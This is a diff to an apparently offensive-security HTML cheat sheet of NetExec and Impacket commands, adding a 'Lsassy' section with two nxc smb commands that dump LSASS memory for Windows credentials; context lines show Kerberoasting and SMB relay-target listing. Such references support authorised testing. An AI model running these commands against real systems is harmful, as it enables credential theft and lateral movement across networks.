@@ -2549,6 +2549,9 @@ GetUserSPNs.py -request -dc-ip &lt;IP&gt; &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASS&g
     <div class="code-wrap"><pre data-template>nxc smb --gen-relay-list targets.txt 192.168.1.0/24</pre></div>
     <h3 class="sub-title">/etc/hosts Generation</h3>
     <div class="code-wrap"><pre data-template>nxc smb &lt;IP&gt; --generate-hosts-file hosts</pre></div>
+    <h3 class="sub-title">Lsassy</h3>
+    <div class="code-wrap"><pre data-template>nxc smb &lt;IP&gt; -u '&lt;USER&gt;' -p '&lt;PASS&gt;' -M lsassy
+nxc smb &lt;IP&gt; -u '&lt;USER&gt;' -p '&lt;PASS&gt;' --local-auth -M lsassy</pre></div>
 </div>
 </div>
 
